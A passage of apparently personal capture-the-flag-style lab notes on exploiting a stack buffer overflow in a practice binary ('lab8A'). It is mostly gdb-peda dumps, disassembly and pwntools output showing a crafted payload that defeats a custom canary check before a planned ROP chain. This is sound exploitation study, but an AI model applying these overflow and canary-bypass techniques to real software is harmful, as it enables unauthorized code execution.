+0016| 0xbffff508 --> 0x0
+0020| 0xbffff50c --> 0x0
+0024| 0xbffff510 --> 0x0
+0028| 0xbffff514 --> 0x0
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Breakpoint 1, 0x08048f1a in selectABook ()
+
+OK, canary is 0x6126ac00.
+
+gdb-peda$ c
+Continuing.
+A
+A
+*************************************************
+{|} Aristote's Metaphysics 350 B.C. Book VIII {|}
+*************************************************
+
+To return to the difficulty which has been stated with respect both to definitions and to numbers, what is the cause of their unity? In the case of all things which have several parts and in which the totality is not, as it were, a mere heap, but the whole is something beside the parts, there is a cause; for even in bodies contact is the cause of unity in some cases, and in others viscosity or some other such quality. And a definition is a set of words which is one not by being connected together, like the Iliad, but by dealing with one object.-What then, is it that makes man one; why is he one and not many, e.g. animal + biped, especially if there are, as some say, an animal-itself and a biped-itself? Why are not those Forms themselves the man, so that men would exist by participation not in man, nor in-one Form, but in two, animal and biped, and in general man would be not one but more than one thing, animal and biped?
+
+...please turn to page 394...
+
+..I like to read ^_^ <==  me too
+
+[----------------------------------registers-----------------------------------]
+EAX: 0xbffff700 --> 0x6126ac00
+EBX: 0x80481a8 (<_init>:        push   ebx)
+ECX: 0xbffff6e8 ("me too\n\b\224\b\f\b\020\367\377\277\250\201\004\b")
+EDX: 0x69222da8
+ESI: 0x0
+EDI: 0x80ec00c --> 0x8068100 (<__stpcpy_sse2>:  mov    edx,DWORD PTR [esp+0x4])
+EBP: 0xbffff704 --> 0xbffff728 --> 0x8049990 (<__libc_csu_fini>:        push   ebx)
+ESP: 0xbffff6dc --> 0x0
+EIP: 0x8049144 (<findSomeWords+103>:    mov    eax,DWORD PTR [eax])
+EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x804913b <findSomeWords+94>:        xor    eax,edx
+   0x804913d <findSomeWords+96>:        mov    edx,eax
+   0x804913f <findSomeWords+98>:        mov    eax,ds:0x80edf20
+=> 0x8049144 <findSomeWords+103>:       mov    eax,DWORD PTR [eax]
+   0x8049146 <findSomeWords+105>:       xor    eax,0xdeadbeef
+   0x804914b <findSomeWords+110>:       cmp    edx,eax
+   0x804914d <findSomeWords+112>:       je     0x8049167 <findSomeWords+138>
+   0x804914f <findSomeWords+114>:       mov    DWORD PTR [esp],0x80c0884
+[------------------------------------stack-------------------------------------]
+0000| 0xbffff6dc --> 0x0
+0004| 0xbffff6e0 --> 0xbffff6e8 ("me too\n\b\224\b\f\b\020\367\377\277\250\201\004\b")
+0008| 0xbffff6e4 --> 0x800
+0012| 0xbffff6e8 ("me too\n\b\224\b\f\b\020\367\377\277\250\201\004\b")
+0016| 0xbffff6ec --> 0x80a6f6f (add    BYTE PTR [ebp+0x57],dl)
+0020| 0xbffff6f0 --> 0x80c0894 ('*' <repeats 46 times>, "\n{|}  Welcome to QUEND's Beta-Book-Browser  {|}\n", '*' <repeats 46 times>, "\n\n\t==> reading is for everyone <==\n\t[+] Enter Your Favorite "...)
+0024| 0xbffff6f4 --> 0xbffff710 --> 0x0
+0028| 0xbffff6f8 --> 0x80481a8 (<_init>:        push   ebx)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Breakpoint 2, 0x08049144 in findSomeWords ()
+
+OK. Right now EAX points at the address on the stack where the value of the canary is stored:
+EAX: 0xbffff700 --> 0x6126ac00
+
+We step one instruction:
+
+Breakpoint 2, 0x08049144 in findSomeWords ()
+gdb-peda$ n
+[----------------------------------registers-----------------------------------]
+EAX: 0x6126ac00
+EBX: 0x80481a8 (<_init>:        push   ebx)
+ECX: 0xbffff6e8 ("me too\n\b\224\b\f\b\020\367\377\277\250\201\004\b")
+EDX: 0x69222da8
+ESI: 0x0
+EDI: 0x80ec00c --> 0x8068100 (<__stpcpy_sse2>:  mov    edx,DWORD PTR [esp+0x4])
+EBP: 0xbffff704 --> 0xbffff728 --> 0x8049990 (<__libc_csu_fini>:        push   ebx)
+ESP: 0xbffff6dc --> 0x0
+EIP: 0x8049146 (<findSomeWords+105>:    xor    eax,0xdeadbeef)
+EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x804913d <findSomeWords+96>:        mov    edx,eax
+   0x804913f <findSomeWords+98>:        mov    eax,ds:0x80edf20
+   0x8049144 <findSomeWords+103>:       mov    eax,DWORD PTR [eax]
+=> 0x8049146 <findSomeWords+105>:       xor    eax,0xdeadbeef
+   0x804914b <findSomeWords+110>:       cmp    edx,eax
+   0x804914d <findSomeWords+112>:       je     0x8049167 <findSomeWords+138>
+   0x804914f <findSomeWords+114>:       mov    DWORD PTR [esp],0x80c0884
+   0x8049156 <findSomeWords+121>:       call   0x804fb60 <puts>
+[------------------------------------stack-------------------------------------]
+0000| 0xbffff6dc --> 0x0
+0004| 0xbffff6e0 --> 0xbffff6e8 ("me too\n\b\224\b\f\b\020\367\377\277\250\201\004\b")
+0008| 0xbffff6e4 --> 0x800
+0012| 0xbffff6e8 ("me too\n\b\224\b\f\b\020\367\377\277\250\201\004\b")
+0016| 0xbffff6ec --> 0x80a6f6f (add    BYTE PTR [ebp+0x57],dl)
+0020| 0xbffff6f0 --> 0x80c0894 ('*' <repeats 46 times>, "\n{|}  Welcome to QUEND's Beta-Book-Browser  {|}\n", '*' <repeats 46 times>, "\n\n\t==> reading is for everyone <==\n\t[+] Enter Your Favorite "...)
+0024| 0xbffff6f4 --> 0xbffff710 --> 0x0
+0028| 0xbffff6f8 --> 0x80481a8 (<_init>:        push   ebx)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x08049146 in findSomeWords ()
+
+Now EAX is the value of the canary and is about to be XOR-ed with the 0xdeadbeef constant.
+
+Right. So all we have to do here is to overwrite the buf[] buffer in such a way that we also overwrite the canary with its original value xor-ed with 0xdeadbeef instead of its original value.
+
+A look at the stack:
+gdb-peda$ x/100wx $esp
+0xbffff6dc:     0x00000000      0xbffff6e8      0x00000800      0x7420656d <-- buf
+0xbffff6ec:     0x080a6f6f      0x080c0894      0xbffff710      0x080481a8 <-- buf (0xbffff6ec)
+0xbffff6fc:     0x00000000      0x6126ac00      0xbffff728      0x080491eb <-- there is is (0x6126ac00)
+0xbffff70c:     0x080c0974      0x00000000      0x00000002      0x00000000
+0xbffff71c:     0xbffff7b4      0x00000001      0x6126ac00      0x08049990
+0xbffff72c:     0x080493da      0x00000001      0xbffff7b4      0xbffff7bc
+0xbffff73c:     0x00000000      0x00000000      0x080481a8      0x00000000
+
+
+OK, once again, after providing exactly 24 bytes to the buffer:
+
+Breakpoint 1, 0x08049144 in findSomeWords ()
+gdb-peda$ x/100wx $esp
+0xbffff6dc:     0x00000000      0xbffff6e8      0x00000800      0x41414141
+0xbffff6ec:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff6fc:     0x41414141      0xb3f7930a      0xbffff728      0x080491eb <-- actually it was 25, including the newline, which overwrote the last byte of the canary
+0xbffff70c:     0x080c0974      0x00000000      0x00000002      0x00000000
+0xbffff71c:     0xbffff7b4      0x00000001      0xb3f79300      0x08049990
+0xbffff72c:     0x080493da      0x00000001      0xbffff7b4      0xbffff7bc
+0xbffff73c:     0x00000000      0x00000000      0x080481a8      0x00000000
+
+EAX contains is (the 0a version), but this is because it copied it from the local stack.
+
+The original value of the canary is, as always, null-armored:
+
+gdb-peda$ searchmem 0xb3f7930a 0xbffdf000 0xc0000000
+Searching for '0xb3f7930a' in range: 0xbffdf000 - 0xc0000000
+Found 1 results, display max 1 items:
+[stack] : 0xbffff700 --> 0xb3f7930a
+gdb-peda$ searchmem 0xb3f79300 0xbffdf000 0xc0000000
+Searching for '0xb3f79300' in range: 0xbffdf000 - 0xc0000000
+Found 2 results, display max 2 items:
+[stack] : 0xbffff4ec --> 0xb3f79300
+[stack] : 0xbffff724 --> 0xb3f79300
+
+Yup.
+
+Allright. 24 bytes of garbage, then our leaked canary XOR-ed with 0xdeadbeef, then saved EBP, then our ROP chain.
+gdb-peda$ x/100wx $esp
+0xbffff6dc:     0x00000000      0xbffff6e8      0x00000800      0x41414141
+0xbffff6ec:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff6fc:     0x41414141      0xb3f7930a      0xbffff728      0x080491eb <-- actually it was 25, including the newline, which overwrote the last byte of the canary
+gdb-peda$ x/i 0x080491eb
+   0x80491eb <main+112>:        mov    DWORD PTR [esp],0x80c0993
+   
+ 
+ 
+Doesn't work. We are missing something.
+
+0x08049146 in findSomeWords ()
+gdb-peda$ n
+[----------------------------------registers-----------------------------------]
+EAX: 0x6dc1c900
+EBX: 0x80481a8 (<_init>:        push   ebx)
+ECX: 0xbffff678 ('B' <repeats 24 times>, "\357wl\263\270\366\377\277\360T\005\bU\251\n\b\360T\005\b\213\240\016\b\213\240\016\b\213\240\016\b\213\240\016\b\213\240\016\b\213\240\016\b\213\240\016\b\213\240\016\b\213\240\016\b\213\240\016\b\213\240\016\b\305q\016\b\377\377\377\377\364\313\r\b\024\373\004\b,\372\377\277\377\370\006\bb\365\374\035")
+EDX: 0xf12e35ad
+ESI: 0x0
+EDI: 0x80ec00c --> 0x8068100 (<__stpcpy_sse2>:  mov    edx,DWORD PTR [esp+0x4])
+EBP: 0xbffff694 --> 0xbffff6b8 --> 0x80ea08b --> 0xc641c340
+ESP: 0xbffff66c --> 0x0
+EIP: 0x804914b (<findSomeWords+110>:    cmp    edx,eax)
+EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x804913f <findSomeWords+98>:        mov    eax,ds:0x80edf20
+   0x8049144 <findSomeWords+103>:       mov    eax,DWORD PTR [eax]
+   0x8049146 <findSomeWords+105>:       xor    eax,0xdeadbeef
+=> 0x804914b <findSomeWords+110>:       cmp    edx,eax
+   0x804914d <findSomeWords+112>:       je     0x8049167 <findSomeWords+138>
+   0x804914f <findSomeWords+114>:       mov    DWORD PTR [esp],0x80c0884
+   0x8049156 <findSomeWords+121>:       call   0x804fb60 <puts>
+   0x804915b <findSomeWords+126>:       mov    DWORD PTR [esp],0x1
+[------------------------------------stack-------------------------------------]
+0000| 0xbffff66c --> 0x0
+0004| 0xbffff670 --> 0xbffff678 ('B' <repeats 24 times>, "\357wl\263\270\366\377\277\360T\005\bU\251\n\b\360T\005\b\213\240\016\b\213\240\016\b\213\240\016\b\213\240\016\b\213\240\016\b\213\240\016\b\213\240\016\b\213\240\016\b\213\240\016\b\213\240\016\b\213\240\016\b\305q\016\b\377\377\377\377\364\313\r\b\024\373\004\b,\372\377\277\377\370\006\bb\365\374\035")
+0008| 0xbffff674 --> 0x800
+0012| 0xbffff678 ('B' <repeats 24 times>, "\357wl\263\270\366\377\277\360T\005\bU\251\n\b\360T\005\b\213\240\016\b\213\240\016\b\213\240\016\b\213\240\016\b\213\240\016\b\213\240\016\b\213\240\016\b\213\240\016\b\213\240\016\b\213\240\016\b\213\240\016\b\305q\016\b\377\377\377\377\364\313\r\b\024\373\004\b,\372\377\277\377\370\006\bb\365\374\035")
+0016| 0xbffff67c ('B' <repeats 20 times>, "\357wl\263\270\366\377\277\360T\005\bU\251\n\b\360T\005\b\213\240\016\b\213\240\016\b\213\240\016\b\213\240\016\b\213\240\016\b\213\240\016\b\213\240\016\b\213\240\016\b\213\240\016\b\213\240\016\b\213\240\016\b\305q\016\b\377\377\377\377\364\313\r\b\024\373\004\b,\372\377\277\377\370\006\bb\365\374\035")
+0020| 0xbffff680 ('B' <repeats 16 times>, "\357wl\263\270\366\377\277\360T\005\bU\251\n\b\360T\005\b\213\240\016\b\213\240\016\b\213\240\016\b\213\240\016\b\213\240\016\b\213\240\016\b\213\240\016\b\213\240\016\b\213\240\016\b\213\240\016\b\213\240\016\b\305q\016\b\377\377\377\377\364\313\r\b\024\373\004\b,\372\377\277\377\370\006\bb\365\374\035")
+0024| 0xbffff684 ('B' <repeats 12 times>, "\357wl\263\270\366\377\277\360T\005\bU\251\n\b\360T\005\b\213\240\016\b\213\240\016\b\213\240\016\b\213\240\016\b\213\240\016\b\213\240\016\b\213\240\016\b\213\240\016\b\213\240\016\b\213\240\016\b\213\240\016\b\305q\016\b\377\377\377\377\364\313\r\b\024\373\004\b,\372\377\277\377\370\006\bb\365\374\035")
+0028| 0xbffff688 ("BBBBBBBB\357wl\263\270\366\377\277\360T\005\bU\251\n\b\360T\005\b\213\240\016\b\213\240\016\b\213\240\016\b\213\240\016\b\213\240\016\b\213\240\016\b\213\240\016\b\213\240\016\b\213\240\016\b\213\240\016\b\213\240\016\b\305q\016\b\377\377\377\377\364\313\r\b\024\373\004\b,\372\377\277\377\370\006\bb\365\374\035")
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x0804914b in findSomeWords ()
+
+So, after we provided our XOR-ed canary:
+
+EAX: 0x6dc1c900
+EDX: 0xf12e35ad	<-- OK, where did this come from?
+
+While they're supposed to be equal.
+So, where did this EDX come from?
+
+0x0804913f <+98>:    mov    eax,ds:0x80edf20 ?
+
+   0x0804912d <+80>:    mov    eax,ds:0x80edf20
+   0x08049132 <+85>:    mov    edx,DWORD PTR [eax]
+   0x08049134 <+87>:    mov    eax,ds:0x80edf24
+   0x08049139 <+92>:    mov    eax,DWORD PTR [eax]
+   0x0804913b <+94>:    xor    eax,edx
+   0x0804913d <+96>:    mov    edx,eax
+   0x0804913f <+98>:    mov    eax,ds:0x80edf20
+   0x08049144 <+103>:   mov    eax,DWORD PTR [eax]
+   0x08049146 <+105>:   xor    eax,0xdeadbeef
+=> 0x0804914b <+110>:   cmp    edx,eax
+
+OK fuck I am confused. It looked like global address check was... KURWA muszę iść do roboty.
+
+   0x0804912d <+80>:    mov    eax,ds:0x80edf20 <-- this
+   0x08049132 <+85>:    mov    edx,DWORD PTR [eax]
+   0x08049134 <+87>:    mov    eax,ds:0x80edf24 <-- and this
+   0x08049139 <+92>:    mov    eax,DWORD PTR [eax] 
+
+Has to be it:
+    global_addr = (&buf+0x1);
+    // have to make sure no one is stealing the librarians cookies (they get angry)
+    global_addr_check = global_addr-0x2;
+	
+But why? OK, it's not. It's this:
+
+    if(((*( global_addr))^(*(global_addr_check))) != ((*( global_addr))^(0xdeadbeef))){
+
+
+   0x0804912d <+80>:    mov    eax,ds:0x80edf20
+   0x08049132 <+85>:    mov    edx,DWORD PTR [eax]
+   0x08049134 <+87>:    mov    eax,ds:0x80edf24
+   0x08049139 <+92>:    mov    eax,DWORD PTR [eax]
+   0x0804913b <+94>:    xor    eax,edx
+   0x0804913d <+96>:    mov    edx,eax				<-- EDX contains what exactly?
+   0x0804913f <+98>:    mov    eax,ds:0x80edf20
+   0x08049144 <+103>:   mov    eax,DWORD PTR [eax]
+   0x08049146 <+105>:   xor    eax,0xdeadbeef		<-- EAX contains the canary from the stack (the one we overwrite)
+=> 0x0804914b <+110>:   cmp    edx,eax
+
+OK, breakpoints once again:
+
+b *(selectABook+15)
+b *(findSomeWords+80)
+
+Step by step.
+
+1)
+EAX: 0xc43c9300 (canary)
+
+  0x804912d <findSomeWords+80>:        mov    eax,ds:0x80edf20	; EAX is 0xbffff700 --> 0xc43c9300 (the address of the canary on the stack - the one we can overwrite here)
+  
+2)
+   0x804912d <findSomeWords+80>:        mov    eax,ds:0x80edf20			; EAX is 0xbffff700 --> 0xc43c9300
+   0x8049132 <findSomeWords+85>:        mov    edx,DWORD PTR [eax]		; now EDX is 0xc43c9300 (canary from the stack)
+=> 0x8049134 <findSomeWords+87>:        mov    eax,ds:0x80edf24			;
+
+3) 
+   0x804912d <findSomeWords+80>:        mov    eax,ds:0x80edf20
+   0x8049132 <findSomeWords+85>:        mov    edx,DWORD PTR [eax]
+   0x8049134 <findSomeWords+87>:        mov    eax,ds:0x80edf24		; now EAX is 0xbffff6f8 --> 0x80481a8
+=> 0x8049139 <findSomeWords+92>:        mov    eax,DWORD PTR [eax]
+   0x804913b <findSomeWords+94>:        xor    eax,edx
+   0x804913d <findSomeWords+96>:        mov    edx,eax
+   0x804913f <findSomeWords+98>:        mov    eax,ds:0x80edf20
+   0x8049144 <findSomeWords+103>:       mov    eax,DWORD PTR [eax]
+   
+
+So, what is this value on our stack actually?
+
+gdb-peda$ x/100wx $esp
+0xbffff6dc:     0x00000000      0xbffff6e8      0x00000800      0x42424242
+0xbffff6ec:     0x42424242      0x0a424242      0xbffff710      0x080481a8 <-- it's here (part of buff)
+0xbffff6fc:     0x00000000      0xc43c9300      0xbffff728      0x080491eb <-- while saved ret, EBP and canary are here
+0xbffff70c:     0x080c0974      0x00000000      0x00000002      0x00000000
+0xbffff71c:     0xbffff7b4      0x00000001      0xc43c9300      0x08049990
+0xbffff72c:     0x080493da      0x00000001      0xbffff7b4      0xbffff7bc
+0xbffff73c:     0x00000000      0x00000000      0x080481a8      0x00000000
+
+So, this means 0x080481a8 is a survival from the selectABook() call and in order to control it we either have to groom it there or propagate it here via buff[24].
+I am really surprised that these two expressions
+    global_addr = (&buf+0x1);
+    // have to make sure no one is stealing the librarians cookies (they get angry)
+    global_addr_check = global_addr-0x2;
+made this. I guess global_addr = (&buf+0x1); considers the size of the buffer as well as the size of the type pointed by the global_addr pointer(int), therefore making the instruction point at the first dword AFTER the buff, which is the canary stored on the stack.
+The second expression 
+global_addr_check = global_addr-0x2;
+makes global_addr_check point at the before-last dword of the buff.
+
+This should be enough for us to understand how to crack this.
+
+   0x0804912d <+80>:    mov    eax,ds:0x80edf20
+   0x08049132 <+85>:    mov    edx,DWORD PTR [eax]		; EDX is the stack-stored canary
+   0x08049134 <+87>:    mov    eax,ds:0x80edf24
+=> 0x08049139 <+92>:    mov    eax,DWORD PTR [eax]		; EAX is the before-last dword of the buff
+   0x0804913b <+94>:    xor    eax,edx					; values are XOR-ed and result is saved in EAX
+   0x0804913d <+96>:    mov    edx,eax					; then moved to EDX
+   0x0804913f <+98>:    mov    eax,ds:0x80edf20			; the stack-stored canary is read in again
+   0x08049144 <+103>:   mov    eax,DWORD PTR [eax]		; into EAX
+   0x08049146 <+105>:   xor    eax,0xdeadbeef			; XOR-ed with 0xdeadbeef 
+   0x0804914b <+110>:   cmp    edx,eax					; and compared with EDX
+  
+Now, we want them match.
+
+This means that the stack-stored canary XOR 0xdeadbeef must equal stack-stored canary XOR-ed with the before-last dword of the buff. Which simply means we just want the before-last dword of buff[24] to be 0xdeadbeef.
+
+OK, for now let's just see if we can bypass the "custom canary" without trying to overwrite the saved RET.
+
+
+
+
+Canary value XOR-ed with 0xdeadbeef: 6483bdef
+/bin/python address: bffffa2c
+[DEBUG] Sent 0x2 bytes:
+    'A\n'
+[DEBUG] Received 0x47c bytes:
+    'A\n'
+    '\n'
+    '*************************************************\n'
+    "{|} Aristote's Metaphysics 350 B.C. Book VIII {|}\n"
+    '*************************************************\n'
+    '\n'
+    'To return to the difficulty which has been stated with respect both to definitions and to numbers, what is the cause of their unity? In the case of all things which have several parts and in which the totality is not, as it were, a mere heap, but the whole is something beside the parts, there is a cause; for even in bodies contact is the cause of unity in some cases, and in others viscosity or some other such quality. And a definition is a set of words which is one not by being connected together, like the Iliad, but by dealing with one object.-What then, is it that makes man one; why is he one and not many, e.g. animal + biped, especially if there are, as some say, an animal-itself and a biped-itself? Why are not those Forms themselves the man, so that men would exist by participation not in man, nor in-one Form, but in two, animal and biped, and in general man would be not one but more than one thing, animal and biped? \n'
+    '\n'
+    '...please turn to page 394...\n'
+    '\n'
+    '..I like to read ^_^ <==  '
+[DEBUG] Sent 0x14 bytes:
+    00000000  42 42 42 42  42 42 42 42  42 42 42 42  42 42 42 42  │BBBB│BBBB│BBBB│BBBB│
+    00000010  ef be ad de                                         │····││
+    00000014
+[*] Switching to interactive mode
+[*] Process '/tmp/lab8A' stopped with exit code 0 (pid 6994)
+[DEBUG] Received 0x1c bytes:
+    '\n'
+    '\t[===] Whew you made it !\n'
+    '\n'
+
+    [===] Whew you made it !
+
+[*] Got EOF while reading in interactive
+
+Awesome, so now we can make findSomeWords() cleanly return instead of calling exit(), therefore we can make the program direct the execution to an address we control (overwritten saved RET).
+
+This time we should be able to use nullbytes (read() does not care, as opposed to scanf()), but also we no longer have to use the original canary (because the overwritten one from the stack is taken). We just make sure that bytes buff[15-18] = 0xdeadbeef to get things done.
+
